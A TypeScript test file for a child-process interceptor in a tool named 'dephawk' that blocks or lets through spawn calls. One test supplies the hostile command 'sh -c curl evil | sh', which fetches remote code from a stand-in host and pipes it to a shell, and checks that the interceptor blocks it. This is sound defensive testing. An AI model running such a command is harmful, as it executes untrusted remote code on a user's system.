import { describe, it, expect, afterEach, beforeEach } from 'vitest';
import childProcess from 'node:child_process';
import { ChildProcessInterceptor } from '../../../src/adapters/interceptors/child-process.interceptor.js';
import type { Disposable } from '../../../src/application/ports.js';
import { recordSpy } from './spy.js';

const SPAWN_SENTINEL = { sentinel: 'spawn' };
let installed: Disposable | undefined;
let realSpawnSync: typeof childProcess.spawnSync;
let spawnCalls: unknown[][];

beforeEach(() => {
  spawnCalls = [];
  realSpawnSync = childProcess.spawnSync;
  (childProcess as unknown as Record<string, unknown>)['spawnSync'] = (
    ...args: unknown[]
  ) => {
    spawnCalls.push(args);
    return SPAWN_SENTINEL;
  };
});

afterEach(() => {
  installed?.dispose();
  installed = undefined;
  (childProcess as unknown as Record<string, unknown>)['spawnSync'] = realSpawnSync;
});

describe('ChildProcessInterceptor', () => {
  it('catches a spawn and renders the full command line', () => {
    const spy = recordSpy();
    spy.deny('spawning not allowed');
    installed = new ChildProcessInterceptor().install(spy.record);

    expect(() => childProcess.spawnSync('sh', ['-c', 'curl evil | sh'])).toThrow(
      /dephawk: blocked/,
    );
    expect(spy.last?.capability).toBe('process.spawn');
    expect(spy.last?.detail).toBe('sh -c curl evil | sh');
    expect(spawnCalls).toHaveLength(0);
  });

  it('passes an allowed spawn through to the original', () => {
    const spy = recordSpy();
    installed = new ChildProcessInterceptor().install(spy.record);

    const result = childProcess.spawnSync('ls', ['-la']);
    expect(result).toBe(SPAWN_SENTINEL);
    expect(spy.last?.detail).toBe('ls -la');
    expect(spawnCalls).toHaveLength(1);
  });

  it('restores originals on dispose', () => {
    const patched = childProcess.spawnSync;
    const local = new ChildProcessInterceptor().install(recordSpy().record);
    expect(childProcess.spawnSync).not.toBe(patched);
    local.dispose();
    expect(childProcess.spawnSync).toBe(patched);
  });
});
